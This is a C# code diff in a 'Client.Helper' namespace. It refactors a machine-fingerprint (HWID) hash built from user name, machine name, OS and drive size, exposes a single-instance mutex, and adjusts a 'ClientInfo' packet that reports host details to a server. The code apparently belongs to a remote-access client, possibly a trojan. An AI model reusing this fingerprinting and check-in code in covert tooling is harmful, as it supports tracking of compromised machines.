@@ -25,14 +25,9 @@ namespace Client.Helper
         {
             try
             {
-                StringBuilder sb = new StringBuilder();
-                sb.Append(Environment.ProcessorCount);
-                sb.Append(Environment.UserName);
-                sb.Append(Environment.MachineName);
-                sb.Append(Environment.OSVersion);
-                sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
-                return GetHash(sb.ToString());
-
+                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName,
+                    Environment.MachineName, Environment.OSVersion
+                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
             }
             catch
             {
@@ -48,10 +43,10 @@ namespace Client.Helper
             StringBuilder strResult = new StringBuilder();
             foreach (byte b in bytesToHash)
                 strResult.Append(b.ToString("x2"));
-            return strResult.ToString().Substring(0, 15).ToUpper();
+            return strResult.ToString().Substring(0, 20).ToUpper();
         }
 
-        private static Mutex _appMutex;
+        public static Mutex _appMutex;
         public static bool CreateMutex()
         {
             bool createdNew;
@@ -109,7 +104,7 @@ namespace Client.Helper
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
-            msgpack.ForcePathObject("HWID").AsString = HWID();
+            msgpack.ForcePathObject("HWID").AsString = Settings.Hwid;
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
